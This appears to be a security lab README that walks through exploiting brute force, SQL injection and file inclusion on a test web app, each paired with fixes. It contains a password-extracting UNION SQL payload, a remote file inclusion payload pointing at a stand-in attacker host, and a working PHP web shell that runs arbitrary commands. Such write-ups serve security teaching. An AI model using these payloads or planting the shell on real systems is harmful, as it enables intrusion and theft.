# Web Hack - Vulnerability Exploitation

## Overview

This project focuses on exploiting three major vulnerabilities within a web platform: **brute force attacks**, **SQL injection**, and **file inclusion**. Below are the steps I followed to take advantage of these vulnerabilities, the tools I used, and how I fixed each one. The project also includes the development of a **PHP web shell** (C99/R57 type), which allows file manipulation (upload, delete) and command execution on the target server.

---

## Vulnerabilities Exploited

### 1. Brute Force Attack on Username and Password

#### Exploitation (BFA)

- **Vulnerability**: The login system lacked sufficient protection against brute-force attacks, meaning it was possible to try multiple username-password combinations without any rate-limiting or captcha protection.
- **Method**: I used a tool called `Hydra` to automate requests to the login page, iterating over common passwords and usernames until I gained access.

#### How to Fix (BFA)

- **Rate Limiting**: Implement rate limiting to restrict the number of login attempts from a single IP address.
- **Account Locking**: After a certain number of failed login attempts, temporarily lock the user’s account and notify them.
- **CAPTCHA**: Add CAPTCHA after a few failed login attempts to prevent automated brute-force attacks.

---

### 2. SQL Injection

#### Exploitation (SQLi)

- **Vulnerability**: The web platform was vulnerable to SQL injection on querying for first name, last name by ID. There was no input sanitization or use of parameterized queries.
- **Method**: By injecting SQL code into vulnerable input fields (e.g., ), I was able to extract sensitive data like usernames and passwords from the database.
  
  ### Example payload
  
  Before:

  ```sql
    SELECT first_name, last_name FROM users WHERE id = '1';
  ```

  After:

  ```sql
  SELECT first_name, last_name FROM users WHERE id = '1' 
  UNION SELECT NULL, password FROM users; -- -';
  ```

#### How to Fix (SQLi)

- **Prepared Statements**: Use prepared statements with parameterized queries to avoid direct injection of user input into SQL queries.
- **Input Validation**: Sanitize and validate all inputs to ensure they are of the expected type, format, and length.
- **WAF**: Implement a Web Application Firewall (WAF) to detect and block SQL injection attempts.

---

### 3. File Inclusion

#### Exploitation (File Inclusion)

- **Vulnerability**: The platform allowed for **local file inclusion (LFI)** and **remote file inclusion (RFI)**, where an attacker could manipulate file paths to include arbitrary files (e.g., configuration files or sensitive system files).
- **Method**: I exploited the file inclusion vulnerability by injecting paths into a parameter, allowing me to access and read sensitive files from the web server.
  
  Example payload:

  ```url
  `?file=http://evil.website.com/evil.php`
  ```

#### How to Fix (File Inclusion)

- **Input Validation**: Restrict file paths and validate inputs to prevent path traversal or unauthorized file inclusion.
- **Use of Whitelists**: Allow only predefined files or paths to be included by maintaining a strict whitelist of allowed files.
- **Disable RFI**: If remote file inclusion is not needed, disable it in the server configuration (`allow_url_include=0` in php.ini).

---

## C99/R57 Type PHP Web Shell

To further demonstrate the risks of these vulnerabilities, I developed a **C99/R57 type PHP web shell** that allows attackers to upload, delete files, and execute arbitrary commands on the server. This shell can be accessed once the vulnerabilities are exploited.

### Shell Features

- **File Upload**: Allows uploading arbitrary files to the server.
- **File Deletion**: Deletes specified files.
- **Command Execution**: Executes arbitrary shell commands.

### Example PHP Web Shell

#### The real Shell can be found in the same directory as this `README.md` but the below is just an example of the basics

```php
<?php
if(isset($_POST['cmd'])){
    system($_POST['cmd']);
}

if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded.";
}

if(isset($_POST['delete'])){
    unlink($_POST['delete']);
    echo "File deleted.";
}
?>
```

### How to Fix

- **File Upload Validation**: Validate the file type and size when allowing file uploads, and store files outside the web root.
- **Access Control**: Ensure sensitive operations like file uploads and deletions are protected by strong authentication and access controls.
- **Disable Dangerous Functions**: Disable potentially dangerous PHP functions such as `system()`, `exec()`, and `shell_exec()` unless absolutely necessary.

---

## Steps to Prevent Vulnerabilities (Conclusion)

1. **Brute Force Prevention**:
   - Implement rate limiting, CAPTCHA, and account locking mechanisms.

2. **SQL Injection Prevention**:
   - Use prepared statements and sanitize all inputs.

3. **File Inclusion Prevention**:
   - Whitelist allowable files and validate input to prevent directory traversal.

---
